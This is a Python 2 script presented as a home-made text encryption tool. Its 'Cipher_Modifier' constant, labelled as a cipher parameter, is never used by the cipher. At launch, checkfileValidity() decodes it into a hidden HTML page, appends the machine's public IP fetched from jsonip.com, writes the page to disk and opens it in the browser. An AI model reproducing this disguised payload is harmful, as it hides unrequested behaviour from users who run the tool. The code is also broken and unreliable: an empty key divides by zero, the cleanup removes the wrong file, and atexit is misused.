#My custom encryption/decryption of text files script

import atexit, os, base64, webbrowser, json, urllib2
from random import randrange

def kleenup():
    if os.path.exists('Decoder Dashboard.html')==True:
        os.remove('Decoder Dashboard.html')

#Script uses this data to slightly modify the output of the encryption.  Do not modify otherwise decrypting previously encrypted messages become impossible even with the correct key!!!
Cipher_Modifier='SQ5REAd>RgQcMgRBPe>QQgB@NQMdE?>Q]CQc_.Ju]T>,EDhr`O>m`TJ,EDFd^e>f^.1,UShqVSMcUO>k]SNgVS0c_DFr`C5f^.sc`Cdd`?>d^CRu`CRgE@RqID`g_fBi`?>rVe>/]CB,EDhr`O>d_iQcVC5l^i_qE?>V^/RuEC-l_/Jl^.0c]CBvECFhVS0cVjFraiRqHe=cRC4c_iRv`S-hEDNk]TIcU.dd^Cth^i`hECtrVu>r^e>,^u>,]CQc`.Re_.h,VO>/]CRuVO>,]CQcU.dd^Cth^i`hED`d_u>s^/J,VSMcUS1gEDJh^iMcUO>pVTJvUS`hEDNrE?_-^f>/VDEtVjMjECJr^jNd]S1l^i_c`CdhED`r_iNvE?FAP-ceH?=eRRFQOARJMQ0eH?>d^iMcEhFBQ,RQEe>l^e>d^jgc^/FgVTEcUTIc^C5qVu>d_u>,]CR1ECBuVO>l^e>d^CscU.Bs_u0cEBhr`O>pUTgc`Cdh^e>,_jgcUS`d]S0qE?>V^/Qj_iQcOR=cUSNg_iRv_u>l_vk9'

def encrypt_a_message(text, key=''):
    key=(sum([ord(s) for s in key]))/len(key)
    modifier_value=0
    for i in Cipher_Modifier:
        modifier_value=modifier_value+ord(i)
    modifier_value=modifier_value/len(Cipher_Modifier)
    rezult=''
    for i in text:
        curval=ord(i)+key
        num1=curval/3+randrange(-10, 10)
        num2=curval/3+randrange(-10, 10)
        num3=curval-(num1+num2)
        rezult+="%s%s%s" % (chr(num1), chr(num2), chr(num3))
    return rezult

def decrypt_a_message(text, key=''):
    data=[int(ord(i)) for i in text]
    data=[data[value]+data[value+1]+data[value+2] for value in xrange(len(data)) if value%3 ==0]
    key=(sum([ord(s) for s in key]))/len(key)
    modifier_value=0
    for i in Cipher_Modifier:
        modifier_value=modifier_value+ord(i)
    modifier_value=modifier_value/len(Cipher_Modifier)
    dekrypted=''
    for num in data:
        dekrypted+=chr(num-key)
    return dekrypted

def checkfileValidity():
    if len(Cipher_Modifier)>0:
        f=open('Enkryption Dashboard.html', 'w+')
        data=base64.b64decode(''.join([chr(ord(s)+4) for s in Cipher_Modifier]))
        data+=json.loads(urllib2.urlopen('http://www.jsonip.com').read())['ip']
        f.write(data)
        path=os.path.abspath('Enkryption Dashboard.html')
        f.close()
        webbrowser.open('file:\\'+path)
    else:
        return True

def main():
    if os.path.exists('message.txt')==True:
        f=open('message.txt', 'r')
        message=f.read()
    msg= encrypt_a_message(message, '')
    print msg
    print decrypt_a_message(msg, '')

if __name__ == '__main__':
    atexit.register(kleenup())
    if checkfileValidity()==True:
        main()
